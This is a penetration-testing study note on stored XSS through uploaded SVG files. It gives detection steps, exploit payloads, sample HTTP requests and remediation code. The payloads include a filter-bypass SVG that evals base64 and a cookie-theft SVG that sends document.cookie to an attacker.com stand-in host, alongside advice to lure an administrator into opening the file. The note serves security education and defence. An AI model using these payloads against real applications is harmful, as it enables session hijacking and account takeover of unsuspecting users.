---
tags: [vapt, file-upload, xss, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.09 File Upload + XSS (SVG with XSS payload)"
---

# 22.09 — File Upload + XSS (SVG with XSS payload)

## What is it?
Scalable Vector Graphics (SVG) are not just image files; they are XML documents that define vector-based graphics. Because they are XML-based and run within the browser's context, SVGs legitimately support embedded `<script>` tags and JavaScript event handlers (like `onload`, `onclick`).

If an application allows users to upload SVG files and then serves those files back to users from the same domain (origin) as the main application with the `Content-Type: image/svg+xml` or `text/html` headers, any embedded JavaScript inside the SVG will be executed by the victim's browser. This results in Stored Cross-Site Scripting (XSS). An attacker can use this to steal session cookies, capture key presses, or force the victim to perform unauthorized actions.

Think of an SVG not as a simple photograph, but as a mini webpage. If you let someone upload their own webpage and serve it directly from your website, they can write code that runs with your website's trust.

## ASCII Diagram
```text
[Attacker] 
   │ 
   │ 1. Uploads payload.svg containing <script>alert(document.cookie)</script>
   ▼
[Web Application] ─── (Saves file to /uploads/payload.svg)
   │
   │ 2. Victim visits profile or clicks direct link to SVG
   ▼
[Victim's Browser]
   │
   │ 3. Browser receives file with Content-Type: image/svg+xml
   │ 4. Parses XML, finds <script> tag
   │ 5. Executes JS in the context of the web application
   ▼
[JS Execution] ───> Steals cookies, sends them to Attacker's server
```

## How to Find It
- **Manual steps:**
  1. Identify any file upload feature that accepts images.
  2. Attempt to upload an SVG file with a basic `alert(1)` payload.
  3. Locate the URL where the uploaded file is served (e.g., `https://target.com/uploads/12345.svg`).
  4. Navigate to that URL directly in your browser.
  5. If the JavaScript executes (the alert pops up) and the file is hosted on the same domain as the application, you have an XSS vulnerability.
  
  *Note: JavaScript inside an SVG will NOT execute if the SVG is embedded via an `<img>` tag on a page. It must be accessed directly via its URL, or embedded using `<object>`, `<embed>`, or `<iframe>` tags.*

- **Tool commands with flags explained:**
  To quickly generate a testing SVG, simply use `echo`:
  ```bash
  # Creates a simple SVG file with an onload XSS payload
  echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>' > test.svg
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Create a malicious SVG containing a JavaScript payload designed to steal cookies or perform actions.
  2. Upload the file to the target application (e.g., as a profile picture or document attachment).
  3. Obtain the URL of the uploaded SVG.
  4. Trick a victim (like an administrator) into visiting the direct URL of the SVG file. For example, if it's a support ticket system, link the file in the ticket body.
  5. When the victim opens the link, the SVG renders, the JavaScript fires, and the payload executes in their session.

- **Actual payloads:**
  **Basic Alert (Proof of Concept):**
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
  </svg>
  ```
  
  **Bypassing basic tag filters using animate:**
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate attributeName="x" from="alert(1)" to="alert(2)" dur="1s" 
             begin="0s" onbegin="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))"/>
  </svg>
  ```

  **Cookie Theft Payload:**
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>
      var img = new Image();
      img.src = 'https://attacker.com/log?cookie=' + encodeURIComponent(document.cookie);
    </script>
  </svg>
  ```

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/upload-avatar HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="avatar"; filename="evil.svg"
  Content-Type: image/svg+xml

  <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
  ------WebKitFormBoundary--
  ```
  **Direct Access Request (Victim):**
  ```http
  GET /uploads/avatars/evil.svg HTTP/1.1
  Host: target.com

  HTTP/1.1 200 OK
  Content-Type: image/svg+xml
  
  <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
  ```

## Real-World Example
In a known bug bounty report, a researcher found an application that converted profile pictures into SVGs for scaling. However, if the user uploaded an SVG directly, the application simply passed it through without sanitization. The researcher uploaded an SVG containing a script that stole local storage tokens. Because the uploaded SVGs were hosted on `app.target.com` instead of a separate static domain, the script had full access to the application's authentication tokens. By sending the direct link of the uploaded avatar to an admin, the researcher completely compromised the admin account.

## How to Fix It
- **Developer remediation:**
  There are three primary ways to fix this, often used together for defense-in-depth:
  1. **Sanitize SVGs:** Use a dedicated library to strip `<script>` tags, `<foreignObject>` tags, and event handler attributes (`onload`, `onclick`, etc.) from the XML structure before saving the file.
  2. **Serve from a separate origin:** Host all user-uploaded files on a separate domain (e.g., `usercontent-target.com`). Even if JS executes, it cannot access the cookies or DOM of the main application due to the Same-Origin Policy.
  3. **Force download:** Serve the file with the `Content-Disposition: attachment` header to force the browser to download the file rather than rendering it inline.

- **Code snippet:**
  **Python (Safe SVG Sanitization using lxml):**
  ```python
  from lxml import etree

  def sanitize_svg(svg_content):
      parser = etree.XMLParser(resolve_entities=False)
      tree = etree.fromstring(svg_content.encode(), parser)
      
      # Remove all script tags
      for element in tree.iter():
          if element.tag.endswith('script'):
              element.getparent().remove(element)
              
          # Remove event handlers (e.g., onload, onerror)
          for attr in list(element.attrib.keys()):
              if attr.startswith('on') or 'javascript:' in element.attrib.get(attr, ''):
                  del element.attrib[attr]
                  
      return etree.tostring(tree)
  ```
  
  **Nginx (Force Download):**
  ```nginx
  location /uploads/ {
      add_header Content-Disposition "attachment";
      # Also prevent MIME sniffing
      add_header X-Content-Type-Options "nosniff";
  }
  ```

## Chaining Opportunities
- This vuln + [[Missing HttpOnly Flag]] → If the session cookie lacks the HttpOnly flag, the SVG XSS payload can directly read the cookie via `document.cookie` and exfiltrate it for immediate Account Takeover.
- This vuln + [[Cross-Site Request Forgery (CSRF)]] → Because the SVG executes on the same origin, the attacker's script can programmatically fetch anti-CSRF tokens and make authenticated requests on behalf of the victim, bypassing all CSRF protections.

## Related Notes
- [[08 - File Upload + SSRF (SVG with SSRF payload)]]
- [[07 - XSS — Stored XSS]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
